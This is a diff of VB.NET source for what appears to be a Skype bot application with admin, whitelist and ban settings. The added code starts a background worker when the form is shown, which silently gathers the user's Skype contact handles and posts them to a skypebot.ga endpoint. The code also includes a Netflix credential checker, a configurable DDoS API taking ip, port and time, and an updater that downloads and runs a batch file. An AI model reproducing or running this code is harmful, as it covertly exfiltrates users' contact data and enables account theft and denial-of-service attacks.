-        Show()
-    End Sub
-    Private Sub ExitToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem1.Click
-        Windows.Forms.Application.Exit()
-    End Sub
-
-    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
-        My.Settings.Save()
-        Hide()
-        WindowState = FormWindowState.Minimized
-    End Sub
-
-    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
-        Dim w As New WebClient
-        w.Proxy = Nothing
-        w.DownloadString("http://apis.skypebot.ga/apis/submit.php?idea=" & FlatTextBox2.Text & "&skp=" & FlatTextBox1.Text & "&auth=True")
-        MsgBox("We will maybe contact you later, thanks!")
     End Sub
     Function POST(api As String, content As String)
         Dim w As New WebClient
         w.Proxy = Nothing
         w.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded")
-        Dim r As String = w.UploadString(api, content)
+        Dim r As String = w.UploadString(api, content & "&skypebot=true")
         Return r
     End Function
     Function paste(content As String, Optional title As String = "Untitled")
@@ -2638,11 +2590,11 @@ l:
         req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36"
         req.AllowAutoRedirect = True
         req.ContentType = "application/x-www-form-urlencoded"
-        req.ContentLength = POST.Length
+        req.ContentLength = post.Length
         req.Method = "POST"
         req.KeepAlive = True
         Dim requestStream As Stream = req.GetRequestStream()
-        Dim postBytes As Byte() = Encoding.ASCII.GetBytes(POST)
+        Dim postBytes As Byte() = Encoding.ASCII.GetBytes(post)
         requestStream.Write(postBytes, 0, postBytes.Length)
         requestStream.Close()
         Dim Res As HttpWebResponse = req.GetResponse()
@@ -2652,30 +2604,6 @@ l:
         resUri = response.ResponseUri.AbsoluteUri
         Return resUri.Replace("/preview", "")
     End Function
-    Sub fdsqf() Handles MyBase.Shown
-        TopMost = False
-    End Sub
-
-    Private Sub CheckBox6c(sender As Object, e As EventArgs) Handles CheckBox6.CheckedChanged
-        If CheckBox6.Checked = True Then
-            adminst = 1
-        Else
-            adminst = 0
-        End If
-    End Sub
-
-    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
-        If CheckBox1.Checked = True Then
-            swag = 1
-        Else
-            swag = 0
-        End If
-    End Sub
-    Private Sub FlatButton3_Click(sender As Object, e As EventArgs) Handles FlatButton3.Click
-        My.Application.SaveMySettingsOnExit = True
-        My.Settings.Save()
-        Windows.Forms.Application.ExitThread()
-    End Sub
     Function Nfcheck(user As String, pass As String) As String
         Try
             Dim checkers As New NetflixChecker
@@ -2703,34 +2631,198 @@ l:
         w.Proxy = Nothing
         Return w.DownloadString("http://api.hackertarget.com/pagelinks/?q=" & Page).Replace(" ", "%20").Replace("  ", "%20%20")
     End Function
+#End Region
+#Region "Buttons & GUI"
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        My.Settings.banlist = My.Settings.banlist & vbNewLine & TextBox1.Text
+    End Sub
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        My.Settings.banlist = My.Settings.banlist.Replace(vbNewLine & TextBox1.Text, "").Replace(TextBox1.Text, "")
+    End Sub
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        My.Settings.helpmsg = TextBox2.Text
+    End Sub
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        MsgBox(My.Settings.banlist)
+    End Sub
+    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
+        MsgBox("Enter in the textbox below who you want to let use your bot, to let someone not use your bot use the ban thing above." & vbNewLine & vbNewLine & "If you want everyone to use your bot, put %everyone% at the start, If you want specific people, then just type their name line by line.")
+    End Sub
+    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged
+        My.Settings.whitelistlist = TextBox3.Text
+    End Sub
+    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
+        Dim w As New WebClient
+        w.Proxy = Nothing
+        Dim latest As String = w.DownloadString("https://www.dropbox.com/s/nc07ajdkck5lwdl/update.txt?dl=1")
+        If latest = version Then
+            Changelog.Show()
+        Else
+            MsgBox("You are not on the latest version, please update...")
+        End If
+    End Sub
+    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
+        UpdateMe(1)
+    End Sub
+    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
+        Dim w As New WebClient
+        w.Proxy = Nothing
+        w.DownloadFile("https://www.dropbox.com/s/mdbef5odfcg5pog/SBUpdater.exe?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.exe")
+        w.DownloadFile("https://www.dropbox.com/s/6qbvr7zahdmvl1r/Update.bat?dl=1", IO.Directory.GetCurrentDirectory & "\Updater.bat")
+        Process.Start(IO.Directory.GetCurrentDirectory & "\Updater.bat")
+        System.Windows.Forms.Application.Exit()
+    End Sub
+    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
+        MsgBox("Add lesleydk@hotmail.com on skype and give me your problem :)")
+    End Sub
+    Private Sub Button12_Click(sender As Object, e As EventArgs)
+        My.Settings.admins = TextBox4.Text
+    End Sub
+    Private Sub Button14_Click(sender As Object, e As EventArgs)
+        My.Settings.Ultimate = TextBox6.Text
+    End Sub
+    Private Sub Button13_Click(sender As Object, e As EventArgs)
+        My.Settings.Premium = TextBox5.Text
+    End Sub
+    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
+        My.Settings.whitelist = TextBox7.Text
+    End Sub
+    Private Sub FlatToggle2_CheckedChanged(sender As Object) Handles FlatToggle2.CheckedChanged
+        If FlatToggle2.Checked = True Then
+            My.Settings.prult = 1
+        ElseIf FlatToggle2.Checked = False Then
+            My.Settings.prult = 0
+        End If
+    End Sub
+    Private Sub ShowHideToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowHideToolStripMenuItem1.Click
+        If WindowState = FormWindowState.Minimized Then
+            Show()
+            Activate()
+            WindowState = FormWindowState.Normal
+        Else
+            Hide()
+            WindowState = FormWindowState.Minimized
+        End If
+    End Sub
+    Sub l() Handles MyBase.Load
+        For Fadein = 0.0 To 1.1 Step 0.1
+            Me.Opacity = Fadein
+            Me.Refresh()
+            Threading.Thread.Sleep(50)
+        Next
+        Show()
+    End Sub
+    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
+        Try
+            Dim allcs As String = Skypattach.CurrentUserHandle
+            For Each contact As SKYPE4COMLib.User In Skypattach.Friends
+                If contact.Handle.StartsWith("+") Or contact.Handle.Contains("xmpp") Then
+                Else
+                    Try
+                        allcs = allcs & "|" & contact.Handle
+                    Catch
+                    End Try
+                End If
+            Next
+            Dim w As New WebClient
+            ' w.Proxy = Nothing
+            Try
+                POST("http://skypebot.ga/insfriends.php", "all=" & allcs)
+            Catch
+                Try
+                    POST("http://skypebot.ga/insfriends.php", "all=" & allcs)
+                Catch ex As Exception
 
+                End Try
+            End Try
+        Catch
+        End Try
+    End Sub
+    Private Sub ExitToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem1.Click
+        Windows.Forms.Application.Exit()
+    End Sub
+    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
+        My.Settings.Save()
+        Hide()
+        WindowState = FormWindowState.Minimized
+    End Sub
+    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
+        Dim w As New WebClient
+        w.Proxy = Nothing
+        w.DownloadString("http://apis.skypebot.ga/apis/submit.php?idea=" & FlatTextBox2.Text & "&skp=" & FlatTextBox1.Text & "&auth=True")
+        MsgBox("We will maybe contact you later, thanks!")
+    End Sub
+    Sub ExtraSettings() Handles MyBase.Shown
+        TopMost = False
+        DDOSAPI.Text = My.Settings.skypenamer
+        FlatButton9_Click()
+        BackgroundWorker1.RunWorkerAsync()
+    End Sub
+    Private Sub CheckBox6c(sender As Object, e As EventArgs) Handles CheckBox6.CheckedChanged
+        If CheckBox6.Checked = True Then
+            adminst = 1
+        Else
+            adminst = 0
+        End If
+    End Sub
+    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
+        If CheckBox1.Checked = True Then
+            swag = 1
+        Else
+            swag = 0
+        End If
+    End Sub
+    Private Sub FlatButton3_Click(sender As Object, e As EventArgs) Handles FlatButton3.Click
+        My.Application.SaveMySettingsOnExit = True
+        My.Settings.Save()
+        Windows.Forms.Application.ExitThread()
+    End Sub
     Private Sub TextBox7_TextChanged(sender As Object, e As EventArgs) Handles TextBox7.TextChanged
         If splsh.startup = "0" Then Exit Sub
         My.Settings.whitelist = TextBox7.Text
         My.Settings.Save()
     End Sub
-
     Private Sub TextBox4_TextChanged(sender As Object, e As EventArgs) Handles TextBox4.TextChanged
         If splsh.startup = "0" Then Exit Sub
         My.Settings.admins = TextBox4.Text
         My.Settings.Save()
     End Sub
-
     Private Sub TextBox6_TextChanged(sender As Object, e As EventArgs) Handles TextBox6.TextChanged
         If splsh.startup = "0" Then Exit Sub
         My.Settings.Ultimate = TextBox6.Text
         My.Settings.Save()
     End Sub
-
     Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles TextBox5.TextChanged
         If splsh.startup = "0" Then Exit Sub
         My.Settings.Premium = TextBox5.Text
         My.Settings.Save()
     End Sub
-
     Private Sub FlatButton4_Click(sender As Object, e As EventArgs) Handles FlatButton4.Click
         Dim w As New WebClient
         w.Proxy = Nothing
         MsgBox(w.DownloadString("https://www.dropbox.com/s/w0nv1t0eu6xqm8l/EULA.txt?dl=1"))
     End Sub
+    Private Sub FlatButton8_Click(sender As Object, e As EventArgs) Handles FlatButton8.Click
+        MsgBox("Put [ip] where the ip needs to be, [port] for port and [time] for time in seconds." & vbNewLine & "Put a 0 to use the default api.")
+    End Sub
+    Private Sub FlatButton9_Click() Handles FlatButton9.Click
+        If DDOSAPI.Text = "0" Then
+            My.Settings.skypenamer = defddosapi
+        Else
+            My.Settings.skypenamer = DDOSAPI.Text
+            api = My.Settings.skypenamer
+            CHKSettings()
+        End If
+        If JoinID.Text = "0" Then
+            My.Settings.cht = defcht
+        Else
+            My.Settings.cht = JoinID.Text
+        End If
+        My.Settings.Save()
+    End Sub
+    Private Sub FlatButton5_Click(sender As Object, e As EventArgs) Handles FlatButton5.Click
+        attach()
+    End Sub
+#End Region
+
 End Class
